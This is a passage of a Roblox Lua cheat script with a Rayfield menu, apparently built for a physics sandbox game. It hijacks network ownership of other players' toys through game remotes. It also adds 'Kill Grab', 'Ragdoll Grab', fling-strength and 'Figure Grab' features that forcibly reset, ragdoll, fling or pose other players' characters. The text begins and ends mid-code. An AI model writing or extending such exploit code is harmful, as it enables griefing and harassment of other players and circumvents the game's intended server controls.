    ["9"] = {{0,1,1,1,1,1,0},{1,0,0,0,0,0,1},{1,0,0,0,0,0,1},{0,1,1,1,1,1,1},{0,0,0,0,0,0,1},{0,0,0,0,0,0,1},{0,1,1,1,1,1,0}},
    [" "] = {{0,0,0,0,0,0,0},{0,0,0,0,0,0,0},{0,0,0,0,0,0,0},{0,0,0,0,0,0,0},{0,0,0,0,0,0,0},{0,0,0,0,0,0,0},{0,0,0,0,0,0,0}},
}

function TextAura_calculateRequiredPixels(text)
    TextAura_totalPixels = 0
    for i = 1, #text do
        TextAura_char = text:sub(i, i):upper()
        TextAura_letter = TextAura_letterData[TextAura_char]
        if TextAura_letter then
            for row = 1, 7 do
                for col = 1, 7 do
                    if TextAura_letter[row][col] == 1 then
                        TextAura_totalPixels = TextAura_totalPixels + 1
                    end
                end
            end
        end
    end
    return TextAura_totalPixels
end

function TextAura_generateTextPositions(count)
    TextAura_positions = {}
    TextAura_letterSpacing = TextAura_TEXT_SCALE * 1.4
    TextAura_pixelSize = TextAura_TEXT_SCALE * 0.6
    TextAura_allPixels = {}
    TextAura_currentX = 0

    for i = 1, #TextAura_CUSTOM_TEXT do
        TextAura_char = TextAura_CUSTOM_TEXT:sub(i, i):upper()
        TextAura_letter = TextAura_letterData[TextAura_char]
        if TextAura_letter then
            for row = 1, 7 do
                for col = 1, 7 do
                    if TextAura_letter[row][col] == 1 then
                        table.insert(TextAura_allPixels, {
                            x = TextAura_currentX + col * TextAura_pixelSize,
                            y = TextAura_TEXT_HEIGHT - row * TextAura_pixelSize
                        })
                    end
                end
            end
            TextAura_currentX = TextAura_currentX + 7 * TextAura_pixelSize + TextAura_letterSpacing
        end
    end

    TextAura_totalWidth = TextAura_currentX - TextAura_letterSpacing
    TextAura_offsetX = -TextAura_totalWidth / 2
    TextAura_offsetY = (7 * TextAura_pixelSize) / 2

    if #TextAura_allPixels > 0 then
        TextAura_step = math.max(1, math.floor(#TextAura_allPixels / count))
        for i = 1, math.min(count, #TextAura_allPixels) do
            TextAura_idx = ((i - 1) * TextAura_step) % #TextAura_allPixels + 1
            TextAura_pixel = TextAura_allPixels[TextAura_idx]
            table.insert(TextAura_positions, Vector3.new(TextAura_pixel.x + TextAura_offsetX, TextAura_pixel.y + TextAura_offsetY, 0))
        end
    end
    return TextAura_positions
end

function TextAura_updateLabel()
    if TextAura_textLabel then
        TextAura_required = TextAura_calculateRequiredPixels(TextAura_CUSTOM_TEXT)
        TextAura_current = #TextAura_textParts
        TextAura_textLabel:Set(TextAura_current .. " / " .. TextAura_required .. " objets (" .. TextAura_CUSTOM_TEXT .. ")")
    end
end

function TextAura_isOwned(part)
    TextAura_owner = part:FindFirstChild("PartOwner")
    return TextAura_owner and TextAura_owner.Value == TextAura_LocalPlayer.Name
end

function TextAura_claimPartOwner(part)
    if not part or not part.Parent then return false end
    TextAura_success = false
    pcall(function()
        TextAura_SetNetworkOwner:FireServer(part, part.CFrame)
        TextAura_success = true
    end)
    return TextAura_success
end

function TextAura_ensureBodyPosition(part)
    if not part or not part.Parent then return nil end
    if TextAura_activeParts[part] then return TextAura_activeParts[part] end

    TextAura_bp = Instance.new("BodyPosition")
    TextAura_bp.Name = "AuraBodyPosition"
    TextAura_bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    TextAura_bp.P = 5e4
    TextAura_bp.D = 1000
    TextAura_bp.Position = part.Position
    TextAura_bp.Parent = part
    TextAura_activeParts[part] = TextAura_bp

    TextAura_model = part:FindFirstAncestorWhichIsA("Model") or part.Parent
    if TextAura_model then
        for _, p in ipairs(TextAura_model:GetDescendants()) do
            if p:IsA("BasePart") then
                p.CanCollide = false
            end
        end
    end

    table.insert(TextAura_textParts, part)
    TextAura_textPositions = TextAura_generateTextPositions(#TextAura_textParts)
    TextAura_updateLabel()
    return TextAura_bp
end

function TextAura_cleanupDestroyedParts()
    for i = #TextAura_textParts, 1, -1 do
        TextAura_part = TextAura_textParts[i]
        if not TextAura_part or not TextAura_part.Parent then
            table.remove(TextAura_textParts, i)
            TextAura_activeParts[TextAura_part] = nil
        end
    end
    if #TextAura_textParts > 0 then
        TextAura_textPositions = TextAura_generateTextPositions(#TextAura_textParts)
    end
    TextAura_updateLabel()
end

TextAura_foundCount = 0
TextAura_processedCount = 0

function TextAura_startTextAura()
    TextAura_foundCount = 0
    TextAura_processedCount = 0
    
    TextAura_heartbeatConnection = TextAura_RunService.Heartbeat:Connect(function()
        if not TextAura_AURA_ACTIVE then return end
        TextAura_cleanupDestroyedParts()

        for i, part in ipairs(TextAura_textParts) do
            if part and part.Parent and TextAura_activeParts[part] and TextAura_textPositions[i] then
                TextAura_char = TextAura_LocalPlayer.Character
                if TextAura_char and TextAura_char.PrimaryPart then
                    TextAura_hrp = TextAura_char.PrimaryPart
                    TextAura_lookVector = TextAura_hrp.CFrame.LookVector
                    TextAura_forwardOffset = TextAura_lookVector * TextAura_TEXT_DISTANCE
                    TextAura_textCFrame = CFrame.new(TextAura_hrp.Position + TextAura_forwardOffset) * CFrame.Angles(0, math.rad(180), 0) * TextAura_hrp.CFrame.Rotation
                    TextAura_pixelWorldPos = TextAura_textCFrame:PointToWorldSpace(TextAura_textPositions[i])
                    TextAura_activeParts[part].Position = TextAura_pixelWorldPos
                end
            end
        end
    end)

    TextAura_scanLoop = task.spawn(function()
        while TextAura_AURA_ACTIVE do
            TextAura_foundCount = 0
            TextAura_char = TextAura_LocalPlayer.Character
            
            if TextAura_char and TextAura_char.PrimaryPart then
                TextAura_rootPos = TextAura_char.PrimaryPart.Position
                TextAura_toyFolder = TextAura_Workspace:FindFirstChild("PlotItems")
                
                if TextAura_toyFolder then
                    for _, TextAura_plot in ipairs(TextAura_toyFolder:GetChildren()) do
                        for _, TextAura_model in ipairs(TextAura_plot:GetChildren()) do
                            if TextAura_model:IsA("Model") and TextAura_model.Name == "DrawerLightBrown" then
                                TextAura_foundCount = TextAura_foundCount + 1
                                TextAura_soundPart = TextAura_model:FindFirstChild("SoundPart")
                                
                                if TextAura_soundPart then
                                    TextAura_distance = (TextAura_soundPart.Position - TextAura_rootPos).Magnitude
                                    
                                    if TextAura_distance <= TextAura_AURA_RADIUS then
                                        if not TextAura_activeParts[TextAura_soundPart] then
                                            TextAura_now = tick()
                                            TextAura_last = TextAura_recentParts[TextAura_soundPart]
                                            
                                            if not TextAura_last or (TextAura_now - TextAura_last > TextAura_PER_PART_THROTTLE) then
                                                TextAura_recentParts[TextAura_soundPart] = TextAura_now
                                                TextAura_processedCount = TextAura_processedCount + 1
                                                
                                                if not TextAura_isOwned(TextAura_soundPart) then
                                                    TextAura_claimPartOwner(TextAura_soundPart)
                                                    task.wait(0.1)
                                                end
                                                
                                                if TextAura_isOwned(TextAura_soundPart) then
                                                    TextAura_ensureBodyPosition(TextAura_soundPart)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            
            if TextAura_debugLabel then
                TextAura_debugLabel:Set("Found: " .. TextAura_foundCount .. " | Processed: " .. TextAura_processedCount .. " | Active: " .. #TextAura_textParts)
            end
            
            task.wait(TextAura_SCAN_DELAY)
        end
    end)
end

function TextAura_stopTextAura()
    if TextAura_heartbeatConnection then
        TextAura_heartbeatConnection:Disconnect()
        TextAura_heartbeatConnection = nil
    end
    
    if TextAura_scanLoop then
        task.cancel(TextAura_scanLoop)
        TextAura_scanLoop = nil
    end
    
    for part, bp in pairs(TextAura_activeParts) do
        if bp and bp.Parent then 
            bp:Destroy() 
        end
    end
    
    TextAura_activeParts = {}
    TextAura_textParts = {}
    TextAura_textPositions = {}
    TextAura_recentParts = {}
    TextAura_foundCount = 0
    TextAura_processedCount = 0
    TextAura_updateLabel()
    if TextAura_debugLabel then
        TextAura_debugLabel:Set("Found: 0 | Processed: 0 | Active: 0")
    end
end

ToyTab:CreateInput({
    Name = "Text to be shown showed wtv",
    PlaceholderText = "write it here buddy",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        TextAura_CUSTOM_TEXT = Text:upper()
        if #TextAura_textParts > 0 then
            TextAura_textPositions = TextAura_generateTextPositions(#TextAura_textParts)
        end
        TextAura_updateLabel()
    end,
})

ToyTab:CreateSlider({
    Name = "Text Height",
    Range = {80, 300},
    Increment = 10,
    CurrentValue = 100,
    Flag = "TextHeight",
    Callback = function(Value)
        TextAura_TEXT_HEIGHT = Value
        if #TextAura_textParts > 0 then
            TextAura_textPositions = TextAura_generateTextPositions(#TextAura_textParts)
        end
    end,
})

ToyTab:CreateSlider({
    Name = "Text Scale",
    Range = {15, 50},
    Increment = 1,
    CurrentValue = 30,
    Flag = "TextScale",
    Callback = function(Value)
        TextAura_TEXT_SCALE = Value
        if #TextAura_textParts > 0 then
            TextAura_textPositions = TextAura_generateTextPositions(#TextAura_textParts)
        end
    end,
})

ToyTab:CreateSlider({
    Name = "Text Distance",
    Range = {20, 35},
    Increment = 1,
    CurrentValue = 30,
    Flag = "TextDistance",
    Callback = function(Value)
        TextAura_TEXT_DISTANCE = Value
    end,
})

TextAura_textLabel = ToyTab:CreateLabel("0 / " .. TextAura_calculateRequiredPixels(TextAura_CUSTOM_TEXT) .. " objets (" .. TextAura_CUSTOM_TEXT .. ")")
TextAura_debugLabel = ToyTab:CreateLabel("Found: 0 | Processed: 0 | Active: 0")

ToyTab:CreateToggle({
    Name = "Aura Text",
    CurrentValue = false,
    Flag = "AuraText",
    Callback = function(Value)
        TextAura_AURA_ACTIVE = Value
        if Value then
            TextAura_startTextAura()
        else
            TextAura_stopTextAura()
        end
    end,
})

ToyTab:CreateButton({
    Name = "Reset toys (in case if few toys r stuck or froze client sided wich shouldn't happen ?)",
    Callback = function()
        TextAura_stopTextAura()
        task.wait(0.5)
        if TextAura_AURA_ACTIVE then
            TextAura_startTextAura()
        end
    end,
})




Players = game:GetService("Players")
 ReplicatedStorage = game:GetService("ReplicatedStorage")
 RunService = game:GetService("RunService")
 Workspace = game:GetService("Workspace")

 LPlayer = Players.LocalPlayer
 Character = LPlayer.Character or LPlayer.CharacterAdded:Wait()
 Root = Character:WaitForChild("HumanoidRootPart")

 RG_ToysFolder = Workspace:WaitForChild(LPlayer.Name .. "SpawnedInToys")

 RG_enabled = false
 RG_currentPallet = nil
 RG_ATTR = "OwnedByScript"
 RG_lastHRP = Root.CFrame
 RG_FollowList = {}
 RG_GrabConn, RG_RagdollConn, RG_HeartbeatConn = {}, {}, {}


--// Services
local Players = game:GetService("Players")
local Debris = game:GetService("Debris")
local LocalPlayer = Players.LocalPlayer

--// Tab & Section
local GrabSection = GrabTab:CreateSection("a")

----------------------------------------------------
-- THROW POWER / STRENGTH
----------------------------------------------------

_G.strength = 750
local strengthConnection

GrabTab:CreateSlider({
    Name = "Power",
    Range = {1, 20000},
    Increment = 1,
    Suffix = "Force",
    CurrentValue = 750,
    Flag = "ThrowPowerSlider",
    Callback = function(value)
        _G.strength = value
    end
})

GrabTab:CreateToggle({
    Name = "Strength",
    CurrentValue = false,
    Flag = "ThrowStrengthToggle",
    Callback = function(enabled)

        if enabled then
            strengthConnection = workspace.ChildAdded:Connect(function(model)

                if model.Name == "GrabParts" then
                    local grabPart = model:FindFirstChild("GrabPart")
                    if not grabPart then return end

                    local weld = grabPart:FindFirstChild("WeldConstraint")
                    if not weld then return end

                    local partToImpulse = weld.Part1
                    if not partToImpulse then return end

                    local velocityObj = Instance.new("BodyVelocity")
                    velocityObj.Parent = partToImpulse

                    model:GetPropertyChangedSignal("Parent"):Connect(function()
                        if not model.Parent then

                            if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity =
                                    workspace.CurrentCamera.CFrame.LookVector * _G.strength

                                Debris:AddItem(velocityObj, 1)
                            else
                                velocityObj:Destroy()
                            end

                        end
                    end)
                end
            end)

        elseif strengthConnection then
            strengthConnection:Disconnect()
            strengthConnection = nil
        end
    end
})

----------------------------------------------------
-- KILL GRAB (StateType + RigType R15)
----------------------------------------------------

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local killGrabEnabled = false

workspace.ChildAdded:Connect(function(v)

    if not killGrabEnabled then return end
    if not v:IsA("Model") or v.Name ~= "GrabParts" then return end

    task.wait(0.05)

    local grabPart = v:FindFirstChild("GrabPart")
    if not grabPart then return end

    local weld = grabPart:FindFirstChild("WeldConstraint")
    if not weld then return end

    local part1 = weld.Part1
    if not part1 then return end
    if not part1.Parent then return end
    if part1.Parent == LocalPlayer.Character then return end

    local targetChar = part1.Parent
    local humanoid = targetChar:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end



    ------------------------------------------------
    -- FORCE R15 RIG
    ------------------------------------------------
    local player = Players:GetPlayerFromCharacter(targetChar)
    if player then
        pcall(function()

            -- this forces roblox to rebuild the character
            player:LoadCharacterWithHumanoidDescription(
                Players:GetHumanoidDescriptionFromUserId(player.UserId),
                Enum.HumanoidRigType.R15
            )

        end)
    end

end)

GrabTab:CreateToggle({
    Name = "Kill Grab",
    CurrentValue = false,
    Flag = "KillGrabToggle",
    Callback = function(Value)
        killGrabEnabled = Value
    end
})

GrabTab:CreateToggle({
    Name = "Ragdoll Grab",
    CurrentValue = false,
    Flag = "RagdollGrabToggle",
    Callback = function(state)
        RG_enabled = state

        if not state then
            for _, conn in ipairs(RG_GrabConn) do conn:Disconnect() end
            for _, conn in ipairs(RG_RagdollConn) do conn:Disconnect() end
            for _, conn in ipairs(RG_HeartbeatConn) do conn:Disconnect() end
            RG_GrabConn = {}
            RG_RagdollConn = {}
            RG_HeartbeatConn = {}
            RG_FollowList = {}
            RG_currentPallet = nil
            return
        end

        local function RG_getSpawnCFrame()
            local char = LPlayer.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    RG_lastHRP = hrp.CFrame
                    return hrp.CFrame
                end
            end
            return RG_lastHRP
        end

        local function RG_teleAway(pallet)
            if not pallet then return end
            for _, part in ipairs(pallet:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CFrame = CFrame.new(0, 9e18, 0)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Transparency = 1
                end
            end
        end

        local function RG_spawnPallet()
            local pos = RG_getSpawnCFrame()
            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                "PalletLightBrown",
                pos * CFrame.new(5, 0, 5),
                Vector3.new(0, 33, 0)
            )
        end

        -- 🔧 FIXED: ownership spam protection
        local function RG_handlePallet(pallet)
            if pallet:GetAttribute(RG_ATTR) then return end
            if RG_currentPallet and RG_currentPallet.Parent then return end

            local soundPart = pallet:WaitForChild("SoundPart")
            local ownershipConfirmed = false

            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)

            local triesDelay = 0.25
            local maxTime = 3
            local lastTry = 0
            local startTime = tick()

            local conn
            conn = RunService.Heartbeat:Connect(function()
                if ownershipConfirmed then
                    conn:Disconnect()
                    return
                end

                local ownerTag = soundPart:FindFirstChild("PartOwner")
                if ownerTag and ownerTag.Value == LPlayer.Name then
                    ownershipConfirmed = true

                    pallet:SetAttribute(RG_ATTR, true)
                    RG_currentPallet = pallet

                    for _, part in ipairs(pallet:GetDescendants()) do
                        if part:IsA("BasePart") then
                            if not part:FindFirstChild("RG_BV") then
                                local bv = Instance.new("BodyVelocity")
                                bv.Name = "RG_BV"
                                bv.Velocity = Vector3.new(0, 200, 0)
                                bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                                bv.P = 1e4
                                bv.Parent = part
                            end
                            part.CanCollide = false
                            part.Transparency = 1
                        end
                    end

                    conn:Disconnect()
                    return
                end

                if tick() - lastTry < triesDelay then return end
                lastTry = tick()

                if tick() - startTime >= maxTime then
                    ReplicatedStorage.MenuToys.DestroyToy:FireServer(pallet)
                    conn:Disconnect()
                    return
                end

                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            end)
        end

        local function RG_followLoop(player)
            if RG_FollowList[player] then return end
            RG_FollowList[player] = true

            local humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
            local rag = humanoid and humanoid:FindFirstChild("Ragdolled")

            task.spawn(function()
                while RG_enabled and RG_FollowList[player] and RG_currentPallet do
                    if not rag or not rag.Value then
                        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            for _, part in ipairs(RG_currentPallet:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CFrame = hrp.CFrame
                                    part.CanCollide = false
                                    part.Transparency = 1
                                end
                            end
                        end
                    else
                        break
                    end
                    task.wait(0.1)
                end
                RG_FollowList[player] = nil
                RG_teleAway(RG_currentPallet)
            end)

            if rag and rag:IsA("BoolValue") then
                local conn
                conn = rag.Changed:Connect(function(val)
                    if val then
                        RG_FollowList[player] = nil
                        RG_teleAway(RG_currentPallet)
                        conn:Disconnect()
                    end
                end)
                table.insert(RG_RagdollConn, conn)
            end
        end

        local function RG_monitorGrabParts(container)
            task.spawn(function()
                while container.Parent and RG_enabled do
                    local grabPart = container:FindFirstChild("GrabPart")
                    local weld = grabPart and grabPart:FindFirstChildOfClass("WeldConstraint")
                    if weld and weld.Part1 then
                        for _, plr in ipairs(Players:GetPlayers()) do
                            if plr.Character and weld.Part1:IsDescendantOf(plr.Character) then
                                RG_followLoop(plr)
                            end
                        end
                    else
                        for plr in pairs(RG_FollowList) do
                            RG_FollowList[plr] = nil
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end

        table.insert(RG_GrabConn, RG_ToysFolder.ChildAdded:Connect(function(c)
            if c.Name == "PalletLightBrown" then
                RG_handlePallet(c)
            end
        end))

        table.insert(RG_GrabConn, RG_ToysFolder.ChildRemoved:Connect(function(c)
            if c == RG_currentPallet then
                RG_currentPallet = nil
            end
        end))

        table.insert(RG_GrabConn, Workspace.ChildAdded:Connect(function(c)
            if c.Name == "GrabParts" then
                RG_monitorGrabParts(c)
            end
        end))

        table.insert(RG_HeartbeatConn, RunService.Heartbeat:Connect(function()
            if not RG_enabled then return end
            if not RG_currentPallet or not RG_currentPallet.Parent then
                local owned
                for _, toy in ipairs(RG_ToysFolder:GetChildren()) do
                    if toy:GetAttribute(RG_ATTR) then
                        owned = toy
                        break
                    end
                end
                if owned then
                    RG_currentPallet = owned
                else
                    RG_spawnPallet()
                end
            end
        end))

        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj.Name == "GrabParts" then
                RG_monitorGrabParts(obj)
            end
        end

        RG_spawnPallet()
    end
})

LPlayer.CharacterAdded:Connect(function(char)
    Character = char
    Root = char:WaitForChild("HumanoidRootPart")
    RG_lastHRP = Root.CFrame
end)

getgenv().FigureGrabModule = getgenv().FigureGrabModule or {}

FigureGrabModule.Players = game:GetService("Players")
FigureGrabModule.RunService = game:GetService("RunService")
FigureGrabModule.ReplicatedStorage = game:GetService("ReplicatedStorage")
FigureGrabModule.UserInputService = game:GetService("UserInputService")

FigureGrabModule.LocalPlayer = FigureGrabModule.Players.LocalPlayer
FigureGrabModule.Mouse = FigureGrabModule.LocalPlayer:GetMouse()

FigureGrabModule.GrabEvents = FigureGrabModule.ReplicatedStorage:WaitForChild("GrabEvents")
FigureGrabModule.SetNetworkOwner = FigureGrabModule.GrabEvents:WaitForChild("SetNetworkOwner")

FigureGrabModule.State = {
    FigureGrabEnabled = false,
    FigureGrabConnection = nil,
    TargetCharacter = nil,
    AnimationCopyEnabled = false,
    VectorZero = Vector3.new(0, 0, 0)
}

FigureGrabModule.Configuration = {
    LineDistance = 0,
    HoldPosition = {X = 0, Y = 0, Z = -5},
    HoldRotation = {X = 0, Y = 0, Z = 0},
    LeftArmPosition = {X = 0, Y = 0, Z = 0},
    LeftArmRotation = {X = 0, Y = 0, Z = 0},
    RightArmPosition = {X = 0, Y = 0, Z = 0},
    RightArmRotation = {X = 0, Y = 0, Z = 0},
    LeftLegPosition = {X = 0, Y = 0, Z = 0},
    LeftLegRotation = {X = 0, Y = 0, Z = 0},
    RightLegPosition = {X = 0, Y = 0, Z = 0},
    RightLegRotation = {X = 0, Y = 0, Z = 0},
    HeadPosition = {X = 0, Y = 0, Z = 0},
    HeadRotation = {X = 0, Y = 0, Z = 0}
}

FigureGrabModule.Presets = {
    Pose1 = {
        HoldPosition = {X = 0, Y = 0, Z = -7.5},
        HoldRotation = {X = 90, Y = 0, Z = 108},
        LeftArmPosition = {X = -1.5, Y = 1, Z = -1},
        LeftArmRotation = {X = 283, Y = 0, Z = 0},
        RightArmPosition = {X = 1.5, Y = 0.5, Z = 1},
        RightArmRotation = {X = 270, Y = 0, Z = 0},
        LeftLegPosition = {X = 0.5, Y = -1.5, Z = 0.5},
        LeftLegRotation = {X = 312, Y = 0, Z = 0},
        RightLegPosition = {X = -0.5, Y = -1.5, Z = 0.5},
        RightLegRotation = {X = 283, Y = 0, Z = 0},
        HeadPosition = {X = 0, Y = 1.5, Z = 0},
        HeadRotation = {X = 0, Y = 0, Z = 0},
    },
    Pose2 = {
        HoldPosition = {X = 0, Y = -1.5, Z = -12.5},
        HoldRotation = {X = 272, Y = 0, Z = 0},
        LeftArmPosition = {X = -1, Y = 1, Z = -0.5},
        LeftArmRotation = {X = 90, Y = 0, Z = 0},
        RightArmPosition = {X = 1, Y = 1, Z = -0.5},
        RightArmRotation = {X = 90, Y = 0, Z = 0},
        LeftLegPosition = {X = 1, Y = -1, Z = -0.5},
        LeftLegRotation = {X = 90, Y = 0, Z = 0},
        RightLegPosition = {X = -1, Y = -1, Z = -0.5},
        RightLegRotation = {X = 90, Y = 0, Z = 0},
        HeadPosition = {X = 0, Y = 1, Z = 1},
        HeadRotation = {X = 90, Y = 0, Z = 0},
    },
    Pose3 = {
        HoldPosition = {X = 0, Y = -5.5, Z = -4},
        HoldRotation = {X = 0, Y = 0, Z = 0},
        LeftArmPosition = {X = 1, Y = 7.5, Z = 1.5},
        LeftArmRotation = {X = 0, Y = 0, Z = 0},
        RightArmPosition = {X = 1, Y = 6, Z = 1.5},
        RightArmRotation = {X = 0, Y = 0, Z = 0},
        LeftLegPosition = {X = 0.5, Y = 5, Z = 1.5},
        LeftLegRotation = {X = 0, Y = 0, Z = 92},
        RightLegPosition = {X = -0.5, Y = 5, Z = 1.5},
        RightLegRotation = {X = 0, Y = 0, Z = 90},
        HeadPosition = {X = 0, Y = 0, Z = 0},
        HeadRotation = {X = 0, Y = 0, Z = 0},
    },
    Pose4 = {
        HoldPosition = {X = 1.5, Y = -8.5, Z = -1.5},
        HoldRotation = {X = 0, Y = 0, Z = 0},
        LeftArmPosition = {X = 0, Y = 0, Z = 0},
        LeftArmRotation = {X = 0, Y = 0, Z = 0},
        RightArmPosition = {X = 0, Y = 0, Z = 0},
        RightArmRotation = {X = 0, Y = 0, Z = 0},
        LeftLegPosition = {X = 0, Y = 0, Z = 0},
        LeftLegRotation = {X = 0, Y = 0, Z = 0},
        RightLegPosition = {X = 1.5, Y = 0, Z = 0},
        RightLegRotation = {X = 0, Y = 0, Z = 0},
        HeadPosition = {X = 0, Y = 9, Z = 0},
        HeadRotation = {X = 0, Y = 0, Z = 0},
    },
    Pose5 = {
        HoldPosition = {X = 0, Y = -3, Z = -6},
        HoldRotation = {X = 270, Y = 0, Z = 0},
        LeftArmPosition = {X = -1, Y = 0.5, Z = 0},
        LeftArmRotation = {X = 180, Y = 0, Z = 0},
        RightArmPosition = {X = 1, Y = 0.5, Z = 0},
        RightArmRotation = {X = 180, Y = 0, Z = 0},
        LeftLegPosition = {X = 0, Y = -3, Z = 0},
        LeftLegRotation = {X = 0, Y = 0, Z = 0},
        RightLegPosition = {X = 0, Y = -2, Z = 0.5},
        RightLegRotation = {X = 45, Y = 0, Z = 0},
        HeadPosition = {X = 0, Y = 1.5, Z = -0.5},
        HeadRotation = {X = 270, Y = 0, Z = 0},
    },
    Pose6 = {
        HoldPosition = {X = 5.5, Y = 0.5, Z = -1.5},
        HoldRotation = {X = 345, Y = 39, Z = 0},
        LeftArmPosition = {X = 2, Y = 0.5, Z = 0},
        LeftArmRotation = {X = 0, Y = 43, Z = 121},
        RightArmPosition = {X = -2, Y = 0, Z = -0},
        RightArmRotation = {X = 64, Y = 112, Z = 0},
        LeftLegPosition = {X = -0.5, Y = -2, Z = 0},
        LeftLegRotation = {X = 349, Y = 0, Z = 360},
        RightLegPosition = {X = 0.5, Y = -2, Z = 0},
        RightLegRotation = {X = 345, Y = 360, Z = 10},
        HeadPosition = {X = 0, Y = 1.5, Z = 0},
        HeadRotation = {X = 0, Y = 344, Z = 0},
    },
    Pose7 = {
        HoldPosition = {X = 0, Y = -2, Z = -10},
        HoldRotation = {X = 90, Y = 0, Z = 0},
        LeftArmPosition = {X = -1.5, Y = 0, Z = 0},
        LeftArmRotation = {X = 270, Y = 0, Z = 315},
        RightArmPosition = {X = 1.5, Y = 0, Z = 0},
        RightArmRotation = {X = 270, Y = 0, Z = 45},
        LeftLegPosition = {X = -1, Y = -1.5, Z = 0},
        LeftLegRotation = {X = 90, Y = 0, Z = 0},
        RightLegPosition = {X = 1, Y = -1.5, Z = 0},
        RightLegRotation = {X = 90, Y = 0, Z = 0},
        HeadPosition = {X = 0, Y = 1.5, Z = 0},
        HeadRotation = {X = 0, Y = 0, Z = 0},
    },
    JojoStand = {
        HoldPosition = {X = -4.5, Y = 0.5, Z = -1.5},
        HoldRotation = {X = 8, Y = 349, Z = 0},
        LeftArmPosition = {X = 1.5, Y = 0, Z = -0},
        LeftArmRotation = {X = 15, Y = 62, Z = 41},
        RightArmPosition = {X = -1.5, Y = 0.5, Z = -0.5},
        RightArmRotation = {X = 65, Y = 149, Z = 6},
        LeftLegPosition = {X = -0.5, Y = -2, Z = 0},
        LeftLegRotation = {X = 349, Y = 0, Z = 360},
        RightLegPosition = {X = 0.5, Y = -2, Z = 0},
        RightLegRotation = {X = 345, Y = 360, Z = 10},
        HeadPosition = {X = 0, Y = 1.5, Z = 0},
        HeadRotation = {X = 0, Y = 344, Z = 0},
    }
}

function FigureGrabModule.GetCharacter(player)
    character = player.Character
    if not character then
        if player.CharacterAdded then
            character = player.CharacterAdded:Wait()
        end
    end
    return character
end

function FigureGrabModule.getLimbCFrame(limbName)
    char = FigureGrabModule.LocalPlayer.Character
    if not char then return CFrame.new() end
    
    hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return CFrame.new() end
    
    if limbName == "Head" then
        head = char:FindFirstChild("Head")
        if head then return head.CFrame end
        return hrp.CFrame * CFrame.new(0, 1.5, 0)
    elseif limbName == "Right Arm" then
        rightArm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightUpperArm")
        if rightArm then return rightArm.CFrame end
        return hrp.CFrame * CFrame.new(1.5, 0.5, 0)
    elseif limbName == "Left Arm" then
        leftArm = char:FindFirstChild("Left Arm") or char:FindFirstChild("LeftUpperArm")
        if leftArm then return leftArm.CFrame end
        return hrp.CFrame * CFrame.new(-1.5, 0.5, 0)
    elseif limbName == "Right Leg" then
        rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightUpperLeg")
        if rightLeg then return rightLeg.CFrame end
        return hrp.CFrame * CFrame.new(0.5, -1.5, 0)
    elseif limbName == "Left Leg" then
        leftLeg = char:FindFirstChild("Left Leg") or char:FindFirstChild("LeftUpperLeg")
        if leftLeg then return leftLeg.CFrame end
        return hrp.CFrame * CFrame.new(-0.5, -1.5, 0)
    end
    
    return hrp.CFrame
end

function FigureGrabModule.CopyAnimationsFromLimbs()
    if not FigureGrabModule.State.AnimationCopyEnabled then return end
    if not FigureGrabModule.State.TargetCharacter then return end
    
    local MyCharacter = FigureGrabModule.GetCharacter(FigureGrabModule.LocalPlayer)
    if not MyCharacter then return end
    
    local MyHRP = MyCharacter:FindFirstChild("HumanoidRootPart")
    local MyTorso = MyCharacter:FindFirstChild("Torso")
    local TargetTorso = FigureGrabModule.State.TargetCharacter:FindFirstChild("Torso")

    if not MyHRP or not MyTorso or not TargetTorso then return end
    

    local holdCFrame = MyHRP.CFrame * CFrame.new(
        FigureGrabModule.Configuration.HoldPosition.X, 
        FigureGrabModule.Configuration.HoldPosition.Y, 
        FigureGrabModule.Configuration.HoldPosition.Z
    ) * CFrame.Angles(
        math.rad(FigureGrabModule.Configuration.HoldRotation.X), 
        math.rad(FigureGrabModule.Configuration.HoldRotation.Y), 
        math.rad(FigureGrabModule.Configuration.HoldRotation.Z)
    )

   
    TargetTorso.CFrame = holdCFrame
    

    local torsoRelative = MyHRP.CFrame:ToObjectSpace(MyTorso.CFrame)
    
   
    TargetTorso.CFrame = TargetTorso.CFrame * torsoRelative.Rotation
    
    TargetTorso.Velocity = FigureGrabModule.State.VectorZero
    TargetTorso.RotVelocity = FigureGrabModule.State.VectorZero


    local limbs = {"Head", "Right Arm", "Left Arm", "Right Leg", "Left Leg"}

    for _, limbName in ipairs(limbs) do
        local myPart = MyCharacter:FindFirstChild(limbName)
        local targetPart = FigureGrabModule.State.TargetCharacter:FindFirstChild(limbName)

        if myPart and targetPart then

            local relative = MyTorso.CFrame:ToObjectSpace(myPart.CFrame)
            

            targetPart.CFrame = TargetTorso.CFrame:ToWorldSpace(relative)
            
            targetPart.Velocity = FigureGrabModule.State.VectorZero
            targetPart.RotVelocity = FigureGrabModule.State.VectorZero
        end
    end
end

function FigureGrabModule.ToggleFigureGrab()
    if not FigureGrabModule.State.FigureGrabEnabled then
        MouseTarget = FigureGrabModule.Mouse.Target
        if not MouseTarget then
            Rayfield:Notify({
                Title = "Error",
                Content = "Aim at a player first",
                Duration = 3
            })
            return
        end
        
        FigureGrabModule.State.TargetCharacter = MouseTarget.Parent
